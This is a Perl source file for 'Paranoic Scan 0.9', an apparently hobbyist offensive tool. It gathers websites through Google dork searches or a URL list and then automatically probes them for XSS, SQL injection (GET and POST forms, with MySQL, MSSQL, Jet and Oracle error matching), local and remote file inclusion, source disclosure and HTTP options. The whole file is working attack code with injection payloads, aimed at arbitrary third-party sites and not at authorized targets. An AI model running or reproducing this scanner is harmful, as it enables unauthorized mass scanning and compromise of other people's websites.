#!usr/bin/perl
#Paranoic Scan 0.9 Updated
#(c)0ded by Doddy H 2010
#
#Search in google with a dork
#Scan type :
#
#XSS
#Full Source Discloure
#LFI
#RFI
#SQL GET & POST
#MSSQL
#Oracle
#Jet Database
#Find HTTP Options y Server nAME
#
#

use LWP::UserAgent;
use HTML::LinkExtor;
use HTML::Form;
use URI::Split qw(uri_split);
use IO::Socket;

my $nave = LWP::UserAgent->new;
$nave->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12");
$nave->timeout(5);

installer();

sta();

sub sta {
sub head {
system 'cls';
print qq(


@@@@@   @   @@@@     @   @@  @@@  @@@   @@@  @@@@     @@@   @@@@    @   @@  @@@
 @  @   @    @  @    @    @@  @  @   @   @  @   @    @  @  @   @    @    @@  @ 
 @  @  @ @   @  @   @ @   @@  @ @     @  @ @         @    @        @ @   @@  @ 
 @@@   @ @   @@@    @ @   @ @ @ @     @  @ @          @@  @        @ @   @ @ @ 
 @    @@@@@  @ @   @@@@@  @ @ @ @     @  @ @            @ @       @@@@@  @ @ @ 
 @    @   @  @  @  @   @  @  @@  @   @   @  @   @    @  @  @   @  @   @  @  @@ 
@@@  @@@ @@@@@@  @@@@ @@@@@@  @   @@@   @@@  @@@     @@@    @@@  @@@ @@@@@@  @ 




);
}
&menu;
sub menu {
&head;
print "[a] : Scan a File\n";
print "[b] : Search in google and scan the webs\n\n";
print "[option] : ";
chomp(my $op = <STDIN>);
if ($op =~/a/ig) {
print "\n[+] Wordlist : ";
chomp(my $word = <STDIN>);
my @paginas = repes(cortar(savewords($word)));
my $option = &men;
print "\n\n[+] Opening File\n";
scan($option,@paginas);
} 
elsif ($op=~/b/ig) {
print "\n[+] Dork : ";
chomp(my $dork = <STDIN>);
print "[+] Pages : ";
chomp(my $pag = <STDIN>);
my $option = &men;
print "\n\n[+] Searching in google\n";
my @paginas = &google($dork,$pag);	
scan($option,@paginas);
}
else {
&menu;
}
}
sub scan {
my ($option,@webs) = @_;
print "\n\n[Status] : Scanning\n";
print "[Webs Count] : ".int(@webs)."\n\n\n";
for(@webs) {
if ($option=~/S/ig) {
scansql($_);
} 
if ($option=~/L/ig) {
lfi($_);
}
if ($option=~/R/ig) {
rfi($_);
}
if ($option=~/F/ig) {
fsd($_);
}
if ($option=~/X/ig) {
scanxss($_);
}
if ($option=~/M/ig) {
mssql($_);
}
if ($option=~/J/ig) {
access($_);
}
if ($option=~/O/ig) {
oracle($_);
}
if ($option=~/HT/ig) {
http($_);
}
if ($option=~/A/ig) {
scansql($_);
scanxss($_);
mssql($_);
access($_);
oracle($_);
lfi($_);
rfi($_);
fsd($_);
http($_);
}
}
}
print "\n\n[Status] : Finish\n";
&finish;
}
	 
sub toma {
return $nave->get($_[0])->content;
}

sub savefile {
open (SAVE,">>logs/".$_[0]);
print SAVE $_[1]."\n";
close SAVE; 
}

sub finish {
print "\n\n\n(C) Doddy Hackman 2010\n\n";
<STDIN>;
sta();
}

sub google {
my($a,$b) = @_;
for ($pages=10;$pages<=$b;$pages=$pages+10) {
$code = toma("http://www.google.com.ar/search?hl=&q=".$a."&start=$pages");
my @links = get_links($code);
for my $l(@links) {
if ($l =~/webcache.googleusercontent.com/) {
push(@url,$l);
}
}
}

for(@url) {
if ($_ =~/cache:(.*?):(.*?)\+/) {
push(@founds,$2);
}
}

my @founds = repes(cortar(@founds));
return @founds; 
}



sub http {

my ($scheme, $auth, $path, $query, $frag)  = uri_split($_[0]);

my $socket = IO::Socket::INET->new(
PeerAddr=>$auth, 
PeerPort=>"80", 
Proto=>"tcp"); 

print $socket "OPTIONS  / HTTP/1.0\r\n\r\n";
read $socket,$resultado,"1000";	

if ($resultado=~/Server:(.*)/g) {
my $server = $1;

savefile("http-logs.txt","[+] Page : $auth"."\n");
savefile("http-logs.txt","[+] Server : ".$server."\n");
}
if ($resultado=~/Allow: (.*)/g) {
my $options = $1;
savefile("http-logs.txt","[+] Options : ".$options."\n");
}
$socket->close;
}

sub scanxss { 

my $page = shift;
chomp $page;

my @testar = HTML::Form->parse(toma($page),"/");
my @botones_names;
my @botones_values;
my @orden;
my @pa = ("<script>alert(String.fromCharCode(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111))</script>",'"><script>alert(String.fromCharCode(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111))</script>');
my @get_founds;
my @post_founds;
my @ordenuno;
my @ordendos;

my $contador_forms = 0;

my $valor = "doddyhackman";

for my $test(@testar) {
$contador_forms++;
if ($test->method eq "POST") {
my @inputs = $test->inputs;
for my $in(@inputs) {
if ($in->type eq "submit") { 
if ($in->name eq "") {
push(@botones_names,"submit");
}
push(@botones_names,$in->name);
push(@botones_values,$in->value);
} else {
push(@ordenuno,$in->name,$pa[0]);
push(@ordendos,$in->name,$pa[1]);
}}

for my $n(0..int(@botones_names)-1) {
my @preuno = @ordenuno;
my @predos = @ordendos;
push(@preuno,$botones_names[$n],$botones_values[$n]);
push(@predos,$botones_names[$n],$botones_values[$n]);

my $codeuno = $nave->post($page,\@preuno)->content;
my $codedos = $nave->post($page,\@predos)->content;
if ($codeuno=~/<script>alert\(String.fromCharCode\(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111\)\)<\/script>/ig or 
$codedos=~/<script>alert\(String.fromCharCode\(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111\)\)<\/script>/ig) {
if ($test->attr(name) eq "" or $test->attr(name) eq " ") {
push(@post_founds,$contador_forms);
} else {
push(@post_founds,$test->attr(name));
}}}
} else { #Fin de metodo POST
my @inputs = $test->inputs;
for my $in(@inputs) {	
if ($in->type eq "submit") { 
if ($in->name eq "") {
push(@botones_names,"submit");
}
push(@botones_names,$in->name);
push(@botones_values,$in->value);
} else {
$orden.=''.$in->name.'='.$valor.'&';
}}
chop($orden);
for my $n(0..int(@botones_names)-1) {
my $partedos = "&".$botones_names[$n]."=".$botones_values[$n];
my $final = $orden.$partedos;
for my $strin(@pa) {
chomp $strin;
$final=~s/doddyhackman/$strin/;
$code = toma($page."?".$final);
my $strin = "\Q$strin\E";
if ($code=~/$strin/) {
push(@get_founds,$page."?".$final);
}}}}} 

my @get_founds = repes(@get_founds);
if (int(@get_founds) ne 0) {
for(@get_founds) {
savefile("xss-logs.txt","[+] XSS Found : $_");
print "[+] XSS Found : $_\n\a";
}}

my @post_founds = repes(@post_founds);
if (int(@post_founds) ne 0) {
for my $t(@post_founds) {
if ($t =~/^\d+$/) {
savefile("xss-logs.txt","[+] XSS : Form $t in $page");
print "[+] XSS : Form $t in $page\n\a";
}}}} 


sub scansql { 

my $page = shift;
my $copia = $page;

$co = toma($page."'");

if ($co=~ /supplied argument is not a valid MySQL result resource in <b>(.*)<\/b> on line /ig || $co=~ /mysql_free_result/ig || $co =~ /mysql_fetch_assoc/ig ||$co =~ /mysql_num_rows/ig || $co =~ /mysql_fetch_array/ig || $co =~/mysql_fetch_assoc/ig || $co=~/mysql_query/ig || $co=~/mysql_free_result/ig || $co=~/equivocado en su sintax/ig || $co=~/You have an error in your SQL syntax/ig || $co=~/Call to undefined function/ig) {
savefile("sql-logs.txt","[+] SQL : $page");
print "[+] SQLI : $page\a\n"; 
}

if ($page=~/(.*)\?(.*)/) {
my $page = $1;

my @testar = HTML::Form->parse(toma($page),"/");
my @botones_names;
my @botones_values;
my @orden;
my @get_founds;
my @post_founds;
my @ordenuno;
my @ordendos;

my $contador_forms = 0;

my $valor = "doddyhackman";

for my $test(@testar) {
$contador_forms++;
if ($test->method eq "POST") {
my @inputs = $test->inputs;
for my $in(@inputs) {
if ($in->type eq "submit") { 
if ($in->name eq "") {
push(@botones_names,"submit");
}
push(@botones_names,$in->name);
push(@botones_values,$in->value);
} else {
push(@ordenuno,$in->name,"'");
}}

for my $n(0..int(@botones_names)-1) {
my @preuno = @ordenuno;
push(@preuno,$botones_names[$n],$botones_values[$n]);
my $code = $nave->post($page,\@preuno)->content;
if ($code=~ /supplied argument is not a valid MySQL result resource in <b>(.*)<\/b> on line /ig || $code=~ /mysql_free_result/ig || $code =~ /mysql_fetch_assoc/ig ||$code =~ /mysql_num_rows/ig || $code =~ /mysql_fetch_array/ig || $code =~/mysql_fetch_assoc/ig || $code=~/mysql_query/ig || $code=~/mysql_free_result/ig || $code=~/equivocado en su sintax/ig || $code=~/You have an error in your SQL syntax/ig || $code=~/Call to undefined function/ig) {
if ($test->attr(name) eq "" or $test->attr(name) eq " ") {
push(@post_founds,$contador_forms);
} else {
push(@post_founds,$test->attr(name));
}}}}

my @post_founds = repes(@post_founds);
if (int(@post_founds) ne 0) {
for my $t(@post_founds) {
if ($t =~/^\d+$/) {
savefile("sql-logs.txt","[+] SQLI : Form $t in $page");
print "[+] SQLI : Form $t in $page\n\a";
}}}}}}

sub access {

my $page = shift;
$code1 = toma($page."'");
if ($code1=~/Microsoft JET Database/ig or $code1=~/ODBC Microsoft Access Driver/ig) {
print "[+] Jet DB : $page\a\n";
savefile("jetdb-logs.txt",$page);
}
}

sub mssql {

my $page = shift;
$code1 = toma($page."'");
if ($code1=~/ODBC SQL Server Driver/ig) {
print "[+] MSSQL : $page\a\n";
savefile("mssql-logs.txt",$page);
}
}

sub oracle {

my $page = shift;
$code1 = toma($page."'");
if ($code1=~/Microsoft OLE DB Provider for Oracle/ig) {
print "[+] Oracle : $page\a\n";
savefile("oracle-logs.txt",$page);
}
}

sub rfi {
my $page = shift;
$code1 = toma($page."http:/www.supertangas.com/");
if ($code1=~/Los mejores TANGAS de la red/ig) { #Esto es conocimiento de verdad xDDD
print "[+] RFI : $page\a\n";
savefile("rfi-logs.txt",$page);
}}

sub lfi {
my $page = shift;
$code1 = toma($page."'");
if ($code1=~/No such file or directory in <b>(.*)<\/b> on line/ig) {
print "[+] LFI : $page\a\n";
savefile("lfi-logs.txt",$page);
}}

sub fsd {
my $page = shift;
my ($scheme, $auth, $path, $query, $frag)  = uri_split($page);
if ($path=~/\/(.*)$/) { 
my $me = $1;
$code1 = toma($page.$me);
if ($code1=~/header\((.*)Content-Disposition: attachment;/ig) {
print "[+] Full Source Discloure : $page\a\n";
savefile("fpd-logs.txt",$page);
}}}

sub repes {
my @limpio;
foreach $test(@_) {
push @limpio,$test unless $repe{$test}++;
}
return @limpio;
}

sub savewords {
open (FILE,$_[0]);
@words = <FILE>;
close FILE;
for(@words) {
push(@r,$_);
} 	
return(@r);
} 

sub men {
print "\n\n[+] Scan Type : \n\n";
print "[X] : XSS\n";
print "[S] : SQL\n";
print "[M] : MSSQL\n";
print "[J] : Jet Database\n";
print "[O] : Oracle\n";
print "[L] : LFI\n";
print "[R] : RFI\n";
print "[F] : Full Source Discloure\n";
print "[HT] : HTTP Information\n";
print "[A] : All\n\n";
print "\n[Options] : ";
chomp(my $option = <STDIN>);
return $option;
}

sub cortar {
my @nuevo;
for(@_) {
if ($_ =~/=/) {
@tengo = split("=",$_);
push(@nuevo,@tengo[0]."=");
} else {
push(@nuevo,$_);
}}
return @nuevo;
}

sub get_links {

$test = HTML::LinkExtor->new(\&agarrar)->parse($_[0]);
return @links;

sub agarrar {
my ($a,%b) = @_;
push(@links,values %b); 
}
}


sub installer {
unless (-d "logs/") {
mkdir("logs/","777");
}
}

# ¿ The End ? 